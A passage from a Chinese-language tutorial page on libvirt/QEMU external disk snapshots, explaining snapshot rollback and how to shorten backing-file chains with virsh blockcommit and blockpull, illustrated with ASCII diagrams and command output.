thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* 一旦上面的命令被执行，则原来的镜像f17-base将变为backing file，一个新的镜像被创建.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在再列表查看虚拟机磁盘，你会发现新产生的镜像已经投入使用.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/sn1-of-f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>快照回滚</p><p>截止写此文之时，回滚至&#x27;内置快照&#x27;(system checkpoint或disk-only)是可以使用的.</p><p>虚拟机f17vm1回滚至快照&#x27;snap1&#x27;</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-revert --domain f17vm1 snap1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用 snapshot-revert 回滚 &#x27;外置磁盘快照&#x27; 稍微复杂些，需要涉及到稍微复杂点的问题，需要考虑的是合并&#x27;base&#x27;至&#x27;top&#x27;还是合并&#x27;top&#x27;至&#x27;base&#x27;.也就是说，有两种方式可以选择，外置磁盘快照链的缩短可以使用 blockpull 或 blockcommit .截止目前上游社区仍然在努力完善这项功能.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="合并快照文件">合并快照文件<a class="hash-link" href="#合并快照文件" title="标题的直接链接">​</a></h2><p>外置快照非常有用，但这里有一个问题就是如何合并快照文件来缩短链的长度，如上所述这里</p><p>有两种方式:</p><ul><li>blockcommit: 从 top 合并数据到 base (即合并overlays至backing files).</li><li>blockpull: 将backing file数据合并至overlay中.从 base 到 top .</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockcommit">blockcommit<a class="hash-link" href="#blockcommit" title="标题的直接链接">​</a></h3><p>blockcommit可以让你将&#x27;top&#x27;镜像(在同一条backing file链中)合并至底层的&#x27;base&#x27;镜像.一旦 blockcommit 执行完成，处于最上面的overlay链关系将被指向到底层的overlay或base.这在创建了很长一条链之后用来缩短链长度的时候十分有用.</p><p>下面来个图说明下:</p><p>我们现在有一个镜像叫&#x27;RootBase&#x27;，拥有4个外置快照，&#x27;Active&#x27;为当前VM写入数据的，</p><p>使用&#x27;blockcommit&#x27;可以有以下多种case :</p><p>合并Snap-1, Snap-2 and Snap-3 至 &#x27;RootBase&#x27;
只合并Snap-1 and Snap-2 至 RootBase
只合并Snap-1 至 RootBase
合并Snap-2 至 Snap-1
合并Snap-3 至 Snap-2
合并Snap-2 和 Snap-3 至 Snap-1
注: 合并&#x27;Active&#x27;层(最顶部的overlay)至backing_files的功能还在开发中.</p><p>(下图解释case (6))</p><p>Figure-3</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                 /                  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                /                   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               /  commit data       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                              /                     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                             /                      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            /                       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                           v           commit data  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------. &lt;--------------------&#x27;           .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |                                  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    |&lt;---------------------------------|  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |       Backing File               | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;                                  &#x27;------------&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>举个例子，有以下场景：</p><p>当前: <!-- -->[base]<!-- --> &lt;- sn1 &lt;- sn2 &lt;- sn3 &lt;- sn4(this is active)</p><p>目标: <!-- -->[base]<!-- --> &lt;- sn1 &lt;- sn4 (如此来丢弃sn2,sn3)</p><p>  下面有两种方式，method-a更快,method-b 慢些，但是sn2有效可用. (VM运行态).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        (method-a):</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">           # virsh blockcommit --domain f17 vda --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>[OR]<!-- -->
(method-b):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn2.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn2.qcow2 --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注: 如果手工执行<em>qemu-img</em>命令完成的话, 现在还只能用method-b.
Figure-4</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  /                  |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 /                   |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                /                    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   commit data /         commit data |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              /                      |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             /                       | commit data |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            v                        |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.&lt;----------------------|-------------&#x27;            .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;----------------------&#x27;                          |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   |                                                  |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;-------------------------------------------------| (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;                  Backing File                    &#x27;------------&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图演示了case1的blockcommit走向，现在sn4的backing file指向rootbase.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockpull">blockpull<a class="hash-link" href="#blockpull" title="标题的直接链接">​</a></h3><p>blockpull（qemu中也称作&#x27;block stream&#x27;）可以将backing合并至active，与blockcommit正好相反.截止目前只能将backing file合并至当前使用的active中，也就是说还不支持指定top的合并.
设想一个下面的场景:</p><p>Figure-5</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |              \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |               \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                 \ stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 | stream data      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         | stream data     |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                    v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .------------.      |                 &#x27;---------------&gt;  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            |      &#x27;---------------------------------&gt;  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     | RootBase   |                                           |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            | &lt;---------------------------------------- | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     &#x27;------------&#x27;                 Backing File              &#x27;------------&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用blockpull我们可以将snap-1/2/3中的数据合并至active层，最终rootbase将变成active的直接后端.</p><p>命令如下:</p><p>假设快照已经使用 创建Snapshots 小节中的方式完成:</p><p>如<em>Figure-5</em>中描述的-- <!-- -->[RootBase]<!-- --> &lt;- <!-- -->[Active]<!-- -->.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockpull --domain RootBase  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --path /var/lib/libvirt/images/active.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --base /var/lib/libvirt/images/RootBase.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>后续的工作是我们需要使用virsh来清理掉不用的快照</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-2 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-1 --metadata</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Figure-6</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                    \  stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              | stream data         \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  | stream data  |                       \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |  stream data     |              &#x27;------------------&gt;     v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |                                    .--------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  &#x27;---------------------------------&gt;  |              |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                                                       |  Snap-4      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      &#x27;----------------------------------------------------&gt;  | (Active)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                              &#x27;--------------&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                &#x27;Standalone&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                (w/o backing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                file)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表示的是将所有backing file全部合并至active</p><p>如下执行命令:</p><p>(1) 在我们执行合并 <em>之前</em> 查看一下快照的大小(注意观察&#x27;Active&#x27;):
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        608M -rw-r--r--. 1 qemu qemu 1.0G Oct 11 17:54 /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        2.9M -rw-------. 1 qemu qemu 3.0M Oct 11 18:10 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(2) 单独检查下 &#x27;Active&#x27; 所指向的backing file ::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 2.9M</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backing file: /var/lib/libvirt/images/Snap-3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(3) 开始 <strong>blockpull</strong> 操作.
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh blockpull --domain ptest2-base --path /var/lib/libvirt/images/Active.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Block Pull: [100 %]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Pull complete</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(4) 再检查下快照大小， &#x27;Active&#x27;变得很大
